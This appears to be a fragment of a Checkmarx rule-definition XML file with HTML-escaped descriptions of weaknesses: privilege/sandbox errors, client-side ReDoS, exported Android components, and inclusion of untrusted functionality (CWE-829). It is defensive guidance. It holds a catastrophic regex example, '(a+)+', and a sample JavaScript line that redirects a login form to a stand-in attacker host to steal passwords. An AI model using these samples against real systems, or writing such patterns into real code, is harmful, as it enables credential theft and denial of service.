&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationship Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationship Notes&lt;/div&gt;&lt;div name="oc_265_Relationship Notes" id="oc_265_Relationship Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;This can strongly overlap authorization errors.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Research Gaps"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Research Gaps&lt;/div&gt;&lt;div name="oc_265_Research Gaps" id="oc_265_Research Gaps" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;Many of the following concepts require deeper study. Most privilege
problems are not classified at such a low level of detail, and terminology
is very sparse. Certain classes of software, such as web browsers and
software bug trackers, provide a rich set of examples for further research.
Operating systems have matured to the point that these kinds of weaknesses
are rare, but finer-grained models for privileges, capabilities, or roles
might introduce subtler issues.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Theoretical Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Theoretical Notes&lt;/div&gt;&lt;div name="oc_265_Theoretical Notes" id="oc_265_Theoretical Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;A sandbox could be regarded as an explicitly defined sphere of control, in
that the sandbox only defines a limited set of behaviors, which can only
access a limited set of resources.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;It could be argued that any privilege problem occurs within the context of
a sandbox.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_265_Taxonomy Mappings" id="oc_265_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Privilege / sandbox errors&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_265_Content History" id="oc_265_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Relationships, Relationship Notes,
Taxonomy Mappings, Theoretical Notes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Research Gaps,
Theoretical Notes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-12-28&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1592</key><name>Client_Side_ReDoS</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) can use complex patterns to cause a denial of service (DoS). With certain patterns, processing time can grow exponentially in relation to input size. An attacker can use these regular expressions&amp;#160;to&amp;#160;cause the application&amp;#160;to spend an effectively infinite amount of time processing, preventing legitmate users from accessing the application.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div style="direction: ltr;"&gt;ReDoS (regular expression denial of service) is an algorithmic complexity attack, that exploits exponential time worst case complexity. In particular, certain regex patterns - either explicitly coded in the application, or accepted from user input and used for searching&amp;#160;text&amp;#160;- can cause extreme levels of processing for some input texts. For example, `&lt;code&gt;(a+)+&lt;/code&gt;` would hang on an input of a long string of "aaaaaaaaaaaaaaaaaaaaaaaa!"&lt;/div&gt;
&lt;div style="direction: ltr;"&gt;&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not use input for constructing a regular expression.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Ensure all regexes are not vulnerable to ReDoS, specifically worst case complexity does not cause the application to hang.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Strive to avoid unnecessarily complex expressions, making them as simple as possible.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Validating date based on user-supplied format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    string format = readCookieByName(req, "dateFormat");
    
    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Validating date based on server format&lt;/h4&gt;&lt;pre&gt;
bool validateInput(HttpServletRequest req) {
    string startDate = req.getParameter("startDate");
    string endDate = req.getParameter("endDate");

    // Constrain available formats to hardcoded list
    string style = readCookieByName(req, "dateStyle");
    string format;
    if (style == "YMD") 
        format = "^\d{4}-\d{2}-\d{2}";
    else 
        format = "^\d{2}-\d{2}-\d{4}";

    if (startDate.matches(format) &amp;&amp; endDate.matches(format))
        return true;
    else 
        return false;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password with RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.matches(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;h4&gt;Checking for username in password without RegEx&lt;/h4&gt;&lt;pre&gt;bool validatePassword(HttpServletRequest req) {
    string username = req.getParameter("username");
    string password = req.getParameter("password");

    // Verifies password does not contain username
    if (password.contains(username))
        return false;
    else 
        return true;
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3601</key><name>Accessible_Content_Provider</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Resources exposed&amp;nbsp;by the application are vulnerable to exploitation and compromise of confidentiality by potentially malicious applications that co-inhabit the Android device.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The AndroidManifest.xml file indicates to the application it may expose resources by:&lt;/p&gt;
&lt;p style="padding-left: 30px;"&gt;&lt;span style="font-family: Symbol; text-indent: -24px;"&gt;&amp;middot;&lt;/span&gt;&lt;span style="font-variant-numeric: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: 'Times New Roman';"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&lt;/span&gt;Explictly, by enabling resource exportation with the "android:exported" attribute.&lt;/p&gt;
&lt;p style="padding-left: 30px;"&gt;&lt;span style="font-family: Symbol; text-indent: -24px;"&gt;&amp;middot;&lt;/span&gt;&lt;span style="font-variant-numeric: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: 'Times New Roman';"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&lt;/span&gt;Implictly, by not stating the "android:targetSdkVersion", which then defaults to "1", or setting the value to less than 17. The SDK exposes&amp;nbsp;Content Provider resources for SDK versions lower than 17.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p class="MsoListParagraphCxSpFirst" dir="LTR" style="margin: 0cm 0cm 8pt 36pt; text-indent: -18pt; direction: ltr; unicode-bidi: embed;"&gt;&lt;span style="font-family: Symbol; mso-fareast-font-family: Symbol; mso-bidi-font-family: Symbol;"&gt;&amp;middot;&lt;span style="font-variant-numeric: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: 'Times New Roman';"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;Review AndroidManifest.xml and set&amp;nbsp;"android:exported" to "false' for any resources that are not intended to be exposed to other applications. If required, consider changing approach to a more granular one, where specific permissions are explicitly set for specific resources as dictated by business requirements.&amp;nbsp;&lt;/p&gt;
&lt;p class="MsoListParagraphCxSpFirst" dir="LTR" style="margin: 0cm 0cm 8pt 36pt; text-indent: -18pt; direction: ltr; unicode-bidi: embed;"&gt;&lt;span style="font-family: Symbol;"&gt;&amp;middot;&lt;/span&gt;&lt;span style="font-variant-numeric: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: 'Times New Roman';"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;If&amp;nbsp;&lt;span style="text-indent: -18pt;"&gt;applicable, set the android:targetSdkVersion to values higher than 17 to prevent default exposure of content providers.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3603</key><name>Exported_Service_Without_Permissions</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An exported service, activity, or content provider can be directly accessed by any other application running on the Android device. If specific&amp;#160;access restrictions are not explicitly defined, any installed app can bypass the security sandbox and directly start or bind to this service, performing unauthorized actions or access disallowed user data.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An Android&amp;#160;service or activity can be exported either explicitly, using the `&lt;code&gt;android:exported="true"&lt;/code&gt;` attribute, or implicitly by defining an intent filter for the service. An `&lt;code&gt;android:permission&lt;/code&gt;` attribute must be explicitly declared for each exported service or activity, otherwise the service / activity are globally accessbile.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Do not export services, activities, or content providers unless your application is specifically&amp;#160;intended to do so.&amp;#160;&lt;/li&gt;
&lt;li&gt;Do not define intent filters for your service or activity unless you allow it to be called via implicit intents.&amp;#160;&lt;/li&gt;
&lt;li&gt;If you are exporting a service, activity, etc, ensure you set a particular permission that clients must have in order to launch the service/activity, bind to it, or otherwise get it to respond to an intent.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Exported Service without Required Permission&lt;/h4&gt;&lt;pre&gt;&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"&gt;
    &lt;application&gt;
        &lt;service android:name="com.example.project.MyService"&gt;
            &lt;intent-filter&gt;
                &lt;action android:name="android.intent.action.NEW_OUTGOING_CALL" &gt;&lt;/action&gt;
            &lt;/intent-filter&gt;
        &lt;/service&gt;
    &lt;/application&gt;
&lt;/manifest&gt;&lt;/pre&gt;&lt;h4&gt;Exported Service with Permission Attribute&lt;/h4&gt;&lt;pre&gt;&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"&gt;
    &lt;application&gt;
        &lt;service android:name="com.example.project.MyService" 
                android:permission="android.permission.PROCESS_OUTGOING_CALLS"&gt;
            &lt;intent-filter&gt;
                &lt;action android:name="android.intent.action.NEW_OUTGOING_CALL" &gt;&lt;/action&gt;
            &lt;/intent-filter&gt;
        &lt;/service&gt;
    &lt;application&gt;
&lt;/manifest&gt;
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3605</key><name>Insecure_WebView_Usage</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;
&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
  &lt;head&gt;

    &lt;meta http-equiv="content-type" content="text/html; charset=ISO-8859-1"&gt;
    &lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
    &lt;title&gt;HTTPOnlyCookies XSS&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
            &lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color:#32498d;;font-size:8pt"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&amp;nbsp;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;&lt;font color="white"&gt;Inclusion of Functionality from Untrusted Control Sphere&lt;/font&gt;&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

									&lt;span class="tool"&gt;&lt;span class="tip"&gt; Definition in a New Window &lt;/span&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size:8pt"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;829&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Class)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;
    &lt;span id="script"&gt;&amp;nbsp;&lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_829_Description" id="oc_829_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
				&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The software imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended &lt;span onclick="getDef(&amp;#39;Control Sphere&amp;#39;)" class="gterm"&gt;control sphere&lt;/span&gt;. &lt;/div&gt;
				&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt; &lt;p&gt;When including third-party functionality, such as a web widget, library, or other source of functionality, the software must effectively trust that functionality. Without sufficient &lt;span onclick="getDef(&amp;#39;Protection Mechanism&amp;#39;)" class="gterm"&gt;protection mechanisms&lt;/span&gt;, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own &lt;span onclick="getDef(&amp;#39;Weakness&amp;#39;)" class="gterm"&gt;weaknesses&lt;/span&gt;, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application. &lt;/p&gt; &lt;p&gt;This might lead to many different &lt;span onclick="getDef(&amp;#39;Consequence&amp;#39;)" class="gterm"&gt;consequences&lt;/span&gt; depending on the included functionality, but some examples include injection of malware, &lt;span onclick="getDef(&amp;#39;Information Exposure&amp;#39;)" class="gterm"&gt;information exposure&lt;/span&gt; by granting excessive privileges or &lt;span onclick="getDef(&amp;#39;Permissions&amp;#39;)" class="gterm"&gt;permissions&lt;/span&gt; to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware (&lt;a href="http://cwe.mitre.org/data/definitions/601.html" target="_blank"&gt;CWE-601&lt;/a&gt;). &lt;/p&gt; &lt;/div&gt;
			&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common_Consequences"&gt;&lt;div class="heading"&gt;
        &lt;span id="script"&gt;&amp;nbsp;&lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_829_Common_Consequences" id="oc_829_Common_Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail" style="font-size:8pt"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Availability&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p class="smaller" style="font-weight:normal"&gt;&lt;span class="subheading"&gt;Technical Impact:&lt;/span&gt;&lt;i&gt; Execute unauthorized code or
						commands&lt;/i&gt;&lt;/p&gt;&lt;div style="padding-top:5px"&gt;&lt;p&gt;An attacker could insert malicious functionality into the program by
							causing the program to download code that the attacker has placed into
							the untrusted control sphere, such as a malicious web site.&lt;/p&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative_Examples"&gt;&lt;div class="heading"&gt;
        &lt;span id="script"&gt;&amp;nbsp;&lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_829_Demonstrative_Examples" id="oc_829_Demonstrative_Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;This login webpage includes a weather widget from an external
						website:&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
												Language: &lt;/span&gt;HTML&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top" style="background-color:#ffcccc"&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;div class="header"&amp;gt; Welcome!&lt;/div&gt;&lt;div class="indent "&gt;
								&lt;div style="font-size:90%;"&gt;&amp;lt;div id="loginBox"&amp;gt;Please Login:&lt;/div&gt;
								&lt;div class="indent "&gt;
									&lt;div style="font-size:90%;"&gt;&amp;lt;form id ="loginForm" name="loginForm"
										action="login.php" method="post"&amp;gt;&lt;/div&gt;
									&lt;div style="font-size:90%;"&gt;Username: &amp;lt;input type="text" name="username"
										/&amp;gt;&lt;/div&gt;
									&lt;div style="font-size:90%;"&gt;&amp;lt;br/&amp;gt;&lt;/div&gt;
									&lt;div style="font-size:90%;"&gt;Password: &amp;lt;input type="password" name="password"
										/&amp;gt;&lt;/div&gt;
									&lt;div style="font-size:90%;"&gt;&amp;lt;input type="submit" value="Login" /&amp;gt;&lt;/div&gt;
									&lt;div style="font-size:90%;"&gt;&amp;lt;/form&amp;gt;&lt;/div&gt;
								&lt;/div&gt;
								&lt;div style="font-size:90%;"&gt;&amp;lt;/div&amp;gt;&lt;/div&gt;
								&lt;div style="font-size:90%;"&gt;&amp;lt;div id="WeatherWidget"&amp;gt;&lt;/div&gt;
								&lt;div class="indent "&gt;
									&lt;div style="font-size:90%;"&gt;&amp;lt;script type="text/javascript"
										src="externalDomain.example.com/weatherwidget.js"&amp;gt;&amp;lt;/script&amp;gt;&lt;/div&gt;
								&lt;/div&gt;
								&lt;div style="font-size:90%;"&gt;&amp;lt;/div&amp;gt;&lt;/div&gt;
							&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;/div&amp;gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (&lt;a href="http://cwe.mitre.org/data/definitions/79.html" target="_blank"&gt;CWE-79&lt;/a&gt;). &lt;/p&gt;&lt;p&gt;For example, user login information could easily be stolen with a
							single line added to weatherwidget.js: &lt;/p&gt;&lt;div class="indent Attack"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Attack)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
												Language: &lt;/span&gt;Javascript&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top" style="color:#aa0000"&gt;&lt;div style="font-size:90%;"&gt;&lt;i&gt;...Weather widget code....&lt;/i&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;document.getElementById('loginForm').action =
								"ATTACK.example.com/stealPassword.php";&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;This line of javascript changes the login form's original action
							target from the original website to an attack site. As a result, if a
							user attempts to login their username and password will be sent directly
							to the attack site.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Observed_Examples"&gt;&lt;div class="heading"&gt;Observed Examples&lt;/div&gt;&lt;div name="oc_829_Observed_Examples" id="oc_829_Observed_Examples" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail" style="font-size:8pt"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Reference&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2076" target="_blank"&gt;CVE-2010-2076&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Product does not properly reject DTDs in SOAP
						messages, which allows remote attackers to read arbitrary files, send HTTP
						requests to intranet servers, or cause a denial of service.
					&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0285" target="_blank"&gt;CVE-2004-0285&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Modification of assumed-immutable configuration
						variable in include file allows file inclusion via direct
						request.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0030" target="_blank"&gt;CVE-2004-0030&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Modification of assumed-immutable configuration
						variable in include file allows file inclusion via direct
						request.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0068" target="_blank"&gt;CVE-2004-0068&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Modification of assumed-immutable configuration
						variable in include file allows file inclusion via direct
						request.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2157" target="_blank"&gt;CVE-2005-2157&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Modification of assumed-immutable configuration
						variable in include file allows file inclusion via direct
						request.&lt;/td&gt;&lt;/tr&gt;
				&lt;tr&gt;&lt;td valign="top"&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2162" target="_blank"&gt;CVE-2005-2162&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Modification of assumed-immutable configuration
						variable in include file allows file inclusion via direct
						request.&lt;/td&gt;&lt;/tr&gt;
